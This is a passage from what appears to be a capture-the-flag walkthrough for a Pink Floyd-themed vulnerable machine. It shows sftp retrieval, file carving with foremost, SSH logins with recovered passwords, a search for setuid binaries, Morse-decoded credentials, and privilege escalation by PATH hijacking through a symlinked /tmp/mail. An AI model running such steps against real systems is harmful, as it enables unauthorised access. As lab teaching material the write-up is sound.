</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 14:17 .mail
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         1.9K Oct <span class="m">25</span> 18:56 bio.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         849K Oct <span class="m">24</span> 12:17 syd_barrett_profile_pic.jpg
</span><span class='line'>sftp&gt; ls -alh .mail
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 14:17 .mail/.
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 16:16 .mail/..
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Nov <span class="m">11</span> 05:25 .mail/.stash
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         309B Oct <span class="m">24</span> 14:18 .mail/sent-items
</span><span class='line'>sftp&gt; ls -alh .mail/.stash
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Nov <span class="m">11</span> 05:25 .mail/.stash/.
</span><span class='line'>drwxr-xr-x    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>         512B Oct <span class="m">24</span> 14:17 .mail/.stash/..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">0</span> <span class="m">0</span>        <span class="m">1000</span>        46.6M Aug  <span class="m">7</span> 10:33 .mail/.stash/eclipsed_by_the_moon
</span><span class='line'>sftp&gt;
</span><span class='line'>sftp&gt; get bio.txt
</span><span class='line'>Fetching /bio.txt to bio.txt
</span><span class='line'>/bio.txt                                                                                                                                                                   100% <span class="m">1912</span>     1.9KB/s   00:00  &lt;br/&gt;
</span><span class='line'>sftp&gt; get syd_barrett_profile_pic.jpg
</span><span class='line'>Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
</span><span class='line'>/syd_barrett_profile_pic.jpg                                                                                                                                               100%  849KB 848.6KB/s   00:01  &lt;br/&gt;
</span><span class='line'>sftp&gt; get .mail/sent-items
</span><span class='line'>Fetching /.mail/sent-items to sent-items
</span><span class='line'>/.mail/sent-items                                                                                                                                                          100%  <span class="m">309</span>     0.3KB/s   00:00  &lt;br/&gt;
</span><span class='line'>sftp&gt; get .mail/.stash/eclipsed_by_the_moon
</span><span class='line'>Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
</span><span class='line'>/.mail/.stash/eclipsed_by_the_moon                                                                                                                                         100%   47MB   7.8MB/s   00:06  &lt;br/&gt;
</span><span class='line'>sftp&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Good, let&rsquo;s check the files one by one.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# file eclipsed_by_the_moon
</span><span class='line'>eclipsed_by_the_moon: gzip compressed data, last modified: Tue Nov <span class="m">10</span> 19:15:47 2015, from Unix
</span><span class='line'>root@kali:~/the_wall# tar zxvf eclipsed_by_the_moon
</span><span class='line'>eclipsed_by_the_moon.lsd
</span><span class='line'>root@kali:~/the_wall# file eclipsed_by_the_moon.lsd
</span><span class='line'>eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="p">&amp;</span>ldquo<span class="p">;</span>MSDOS5.0<span class="p">&amp;</span>rdquo<span class="p">;</span>, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors <span class="m">96256</span> <span class="o">(</span>volumes &gt; <span class="m">32</span> MB<span class="o">)</span> , serial number 0x9e322180, unlabeled, FAT <span class="o">(</span><span class="m">16</span> bit<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There is nothing interesting in the frist three files but the last one <code>eclipsed_by_the_moon</code> which the size is 46.6M and it is a <code>gz</code> archive file.</p>

<p>After unzip the file, we got a FAT format system here. Then I use <code>foremost</code> to check and extract interesting files.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# foremost -v -i eclipsed_by_the_moon.lsd
</span><span class='line'>Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
</span><span class='line'>Audit File&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Foremost started at Sun Dec  <span class="m">6</span> 00:57:34 2015
</span><span class='line'>Invocation: foremost -v -i eclipsed_by_the_moon.lsd
</span><span class='line'>Output directory: /root/the_wall/output
</span><span class='line'>Configuration file: /etc/foremost.conf
</span><span class='line'>Processing: eclipsed_by_the_moon.lsd
</span><span class='line'><span class="p">|&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>
</span><span class='line'>File: eclipsed_by_the_moon.lsd
</span><span class='line'>Start: Sun Dec  <span class="m">6</span> 00:57:34 2015
</span><span class='line'>Length: <span class="m">47</span> MB <span class="o">(</span><span class="m">49283072</span> bytes<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Num  Name <span class="o">(</span><span class="nv">bs</span><span class="o">=</span>512<span class="o">)</span>         Size  File Offset     Comment&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;0:  00000418.jpg         <span class="m">123</span> KB          <span class="m">214016</span>    &lt;br/&gt;
</span><span class='line'>*<span class="p">|</span>
</span><span class='line'>Finish: Sun Dec  <span class="m">6</span> 00:57:35 2015&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;1 FILES EXTRACTED&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;jpg:<span class="o">=</span> 1&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Foremost finished at Sun Dec  <span class="m">6</span> 00:57:35 2015
</span></code></pre></td></tr></table></div></figure></p>

<p>Here we got a JPG file extracted. Open it and this is Roger Waters! also his password: <font color='red'><code>hello_is_there_anybody_in_there</code></font></p>

<p><img class="left" src="/downloads/the_wall/00000418.jpg"></p>

<p>From the previous username <code>SydBarrett</code>, we guess Roger&rsquo;s username format should be the same, <code>RogerWaters</code></p>

<p>With this username and password, we can finally get a non privileged SSH shell from the target server&rsquo;s port <code>1965</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# ssh &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#x74;&amp;#111;&amp;#58;&amp;#82;&amp;#x6f;&amp;#x67;&amp;#x65;&amp;#114;&amp;#x57;&amp;#x61;&amp;#116;&amp;#101;&amp;#114;&amp;#115;&amp;#64;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x34;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#82;&amp;#x6f;&amp;#x67;&amp;#x65;&amp;#114;&amp;#87;&amp;#97;&amp;#116;&amp;#101;&amp;#x72;&amp;#x73;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x34;&amp;#56;&lt;/a&gt; -p 1965</span>
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#82;&amp;#111;&amp;#103;&amp;#x65;&amp;#x72;&amp;#x57;&amp;#x61;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#115;&amp;#64;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x34;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x52;&amp;#x6f;&amp;#103;&amp;#x65;&amp;#114;&amp;#87;&amp;#97;&amp;#x74;&amp;#101;&amp;#114;&amp;#x73;&amp;#64;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#x34;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
</span><span class='line'>OpenBSD 5.8 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c">#1066: Sun Aug 16 02:33:00 MDT 2015&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;                   .u!<span class="s2">&quot;`</span>
</span><span class='line'><span class="s2">               .x*&quot;</span><span class="sb">`</span>
</span><span class='line'>           ..+<span class="s2">&quot;NP</span>
</span><span class='line'><span class="s2">        .z&quot;&quot;   ?</span>
</span><span class='line'><span class="s2">      M#`      9     ,     ,</span>
</span><span class='line'><span class="s2">               9 M  d! ,8P&#39;</span>
</span><span class='line'><span class="s2">               R X.:x&#39; R&#39;  ,</span>
</span><span class='line'><span class="s2">               F F&#39; M  R.d&#39;</span>
</span><span class='line'><span class="s2">               d P  @  E`  ,</span>
</span><span class='line'><span class="s2">  ss           P  &#39;  P  N.d&#39;</span>
</span><span class='line'><span class="s2">   x         &#39;&#39;        &#39;</span>
</span><span class='line'><span class="s2">   X               x             .</span>
</span><span class='line'><span class="s2">   9     .f       !         .    $b</span>
</span><span class='line'><span class="s2">   4;    $k      /         dH    $f</span>
</span><span class='line'><span class="s2">   &#39;X   ;$$     z  .       MR   :$</span>
</span><span class='line'><span class="s2">    R   M$$,   :  d9b      M&#39;   tM</span>
</span><span class='line'><span class="s2">    M:  #&#39;$L  ;&#39; M `8      X    MR</span>
</span><span class='line'><span class="s2">    `$;t&#39; $F  # X ,oR      t    Q;</span>
</span><span class='line'><span class="s2">     $$@  R$ H :RP&#39; $b     X    @&#39;</span>
</span><span class='line'><span class="s2">     9$E  @Bd&#39; $&#39;   ?X     ;    W</span>
</span><span class='line'><span class="s2">     `M&#39;  `$M d$    `E    ;.o* :R   ..</span>
</span><span class='line'><span class="s2">      `    &#39;  &quot;</span><span class="s1">&#39;     &#39;</span>    @<span class="s1">&#39;   &#39;</span><span class="nv">$o</span>*<span class="err">&quot;&#39;</span>
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/RogerWaters
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now we are in, next step should be go upper to escape privilege.</p>

<p>After enumeration the file system, I found the following information.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -al /home
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x   <span class="m">7</span> root           wheel          <span class="m">512</span> Oct <span class="m">24</span> 17:36 .
</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root           wheel          <span class="m">512</span> Oct <span class="m">24</span> 18:03 ..
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">4</span> DavidGilmour   DavidGilmour   <span class="m">512</span> Oct <span class="m">28</span> 09:28 DavidGilmour
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">3</span> NickMason      NickMason      <span class="m">512</span> Aug  <span class="m">8</span> 00:33 NickMason
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">3</span> RichardWright  RichardWright  <span class="m">512</span> Nov <span class="m">27</span> 02:02 RichardWright
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>   <span class="m">3</span> RogerWaters    RogerWaters    <span class="m">512</span> Oct <span class="m">28</span> 09:29 RogerWaters
</span><span class='line'>drwxr-xr-x   <span class="m">4</span> root           SydBarrett     <span class="m">512</span> Oct <span class="m">24</span> 18:03 SydBarrett
</span></code></pre></td></tr></table></div></figure></p>

<p>Looks like there are 5 users in the system and we have already got 2, so more like we need to escape to others before get ROOT.</p>

<p>Then we try to find files which set the sticky bit under those three users, and we found:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>find / -perm -u<span class="o">=</span>s -type f -user DavidGilmour 2&gt;/dev/null              &lt;br/&gt;
</span><span class='line'>/usr/local/bin/shineon
</span><span class='line'><span class="nv">$ </span>find / -perm -g<span class="o">=</span>s -type f -user NickMason 2&gt;/dev/null                 &lt;br/&gt;
</span><span class='line'>/usr/local/bin/brick
</span><span class='line'><span class="nv">$ </span>ls -al /usr/local/bin/shineon
</span><span class='line'>-rwsr-s<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  RichardWright  <span class="m">7524</span> Oct <span class="m">25</span> 07:58 /usr/local/bin/shineon
</span><span class='line'><span class="nv">$ </span>ls -al /usr/local/bin/brick
</span><span class='line'>-rws<span class="p">&amp;</span>ndash<span class="p">;</span>s<span class="p">&amp;</span>ndash<span class="p">;</span>x  <span class="m">1</span> NickMason  NickMason  <span class="m">7291</span> Aug  <span class="m">8</span> 00:33 /usr/local/bin/brick
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool!! Any one can run the file <font color="red"><code>/usr/local/bin/brick</code></font> and it has sticky bit set!</p>

<p>Run it and give the correct answer (which should not be a problem if you familiar with Pink Floyd), so I am now Nick Mason!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/usr/local/bin/brick&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;What have we here, laddie?
</span><span class='line'>Mysterious scribbings?
</span><span class='line'>A secret code?
</span><span class='line'>Oh, poems, no less!
</span><span class='line'>Poems everybody!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
</span><span class='line'>/bin/sh: Cannot determine current working directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>NickMason
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>By checking NickMason&rsquo;s home folder, nothing interesting but another jpg file, I downloaded it to my Kali and try to open it but it is not a JPEG file&hellip; it is an Ogg audio file!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_wall# display nick_mason_profile_pic.jpg
</span><span class='line'>display: Not a JPEG file: starts with 0x4f 0x67 <span class="sb">`</span>nick_mason_profile_pic.jpg<span class="err">&#39;</span> @ error/jpeg.c/JPEGErrorHandler/322.
</span><span class='line'>root@kali:~/the_wall# file nick_mason_profile_pic.jpg
</span><span class='line'>nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, <span class="m">44100</span> Hz, ~160000 bps, created by: Xiph.Org libVorbis I
</span><span class='line'>root@kali:~/the_wall#
</span></code></pre></td></tr></table></div></figure></p>

<p>Open and listen it carefully, there is moss code playing in the background. after run some audio analyze tools to curve the morse code out (more details please check <a href="https://highon.coffee/blog/the-wall-walkthrough/" title="Arr0way's walkthrough">Arr0way&rsquo;s walkthrough</a>):</p>

<p><font size='3'><strong><code>.-. .. -.-. .... .- .-. -.. .-- .-. .. --. .... - .---- ----. ....- ...-- ..-. .- .-. ..-. .. ... .-</code></strong></font></p>

<p>Crack the morse code <a href="http://morsecode.scphillips.com/translator.html/" title="Morse Code Translator">online</a> and we got the plaintext which is <code>RICHARDWRIGHT1943FARFISA</code>. So now we got a new login credential: username is <code>RichardWright</code> and password is <font color="red"><code>1943farfisa</code></font>.</p>

<p>Right, now I can <code>su</code> to Richard successfully!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su RichardWright
</span><span class='line'>Password:
</span><span class='line'>ksh: Cannot determine current working directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>RichardWright
</span></code></pre></td></tr></table></div></figure></p>

<p>Now let&rsquo;s back to the other sticky file <code>/usr/local/bin/shineon</code> which is can be run by <code>RichardWright</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -al /usr/local/bin/shineon
</span><span class='line'>-rwsr-s<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  RichardWright  <span class="m">7524</span> Oct <span class="m">25</span> 07:58 /usr/local/bin/shineon
</span></code></pre></td></tr></table></div></figure></p>

<p>After run the program, we know that it call system commands such as <code>ping</code> and <code>mail</code> etc&hellip; Let&rsquo;s check if there is basic coding error we can exploit to priv escape.</p>

<p>Run <code>strings</code> to check the binary file and found it call the command <code>mail</code> without specifying the absolute path.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Menu
</span><span class='line'>1. Calendar
</span><span class='line'>2. Who
</span><span class='line'>3. Check Internet
</span><span class='line'>4. Check Mail
</span><span class='line'>5. Exit
</span><span class='line'>Quitting program!
</span><span class='line'>Invalid choice!
</span><span class='line'>load_menu
</span><span class='line'>Time - The Dark Side of the Moon
</span><span class='line'>/usr/bin/cal
</span><span class='line'>Press ENTER to <span class="k">continue</span>.
</span><span class='line'>Echoes - Meddle
</span><span class='line'>/usr/bin/who
</span><span class='line'>Is There Anybody Out There? - The Wall
</span><span class='line'>/sbin/ping -c <span class="m">3</span> www.google.com
</span><span class='line'>Keep Talking- The Division Bell
</span><span class='line'>mail
</span></code></pre></td></tr></table></div></figure></p>

<p>Now, It&rsquo;s time to move to David!</p>

<p>First, create a symbolic link of <code>/bin/sh</code> to the global writable directory <code>/tmp</code> and name it as <code>mail</code>, then overriding the environment variable <code>$PATH</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ln -s /bin/sh /tmp/mail         &lt;br/&gt;
</span><span class='line'><span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then run <code>/usr/local/bin/shineon</code> and choose number <code>4</code> to call our fake <code>mail</code>, then we got a shell with <code>DavidGilmour</code> priviledge.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/usr/local/bin/shineon
</span><span class='line'>Menu&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ol&gt;
</span><span class='line'>&lt;li&gt;Calendar&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Who&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Check Internet&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Check Mail&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Exit
</span><span class='line'>4
</span><span class='line'>Keep Talking- The Division Bell
</span><span class='line'>mail: Cannot determine current working directory
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>mail: <span class="nb">pwd</span>: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t get current directory - Permission denied
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>DavidGilmour
</span><span class='line'><span class="nv">$ </span><span class="nb">cd</span> /home/DavidGilmour
</span><span class='line'><span class="nv">$ </span>ls -alh
</span><span class='line'>total 408
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">4</span> DavidGilmour  DavidGilmour   512B Oct <span class="m">28</span> 09:28 .
</span><span class='line'>drwxr-xr-x  <span class="m">7</span> root          wheel          512B Oct <span class="m">24</span> 17:36 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour    87B Oct <span class="m">24</span> 17:36 .Xdefaults
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour   773B Oct <span class="m">24</span> 17:36 .cshrc
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour   103B Oct <span class="m">24</span> 17:36 .cvsrc
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour   398B Oct <span class="m">24</span> 17:36 .login
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour   175B Oct <span class="m">24</span> 17:36 .mailrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> DavidGilmour  DavidGilmour   512B Oct <span class="m">26</span> 11:44 .private
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> DavidGilmour  DavidGilmour   218B Oct <span class="m">24</span> 17:36 .profile
